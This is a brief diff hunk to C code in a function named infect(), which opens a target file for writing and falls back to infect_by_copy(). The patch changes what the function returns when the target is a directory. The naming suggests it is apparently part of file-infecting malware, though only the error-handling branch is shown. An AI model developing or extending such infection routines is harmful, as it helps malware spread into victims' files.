@@ -450,7 +450,7 @@ static int infect(const char *path) {
     int fd = open(path, O_RDWR);
     if (fd == -1) {
         return errno == EISDIR
-            ? -errno
+            ? 0
             : infect_by_copy(path);
     }
 
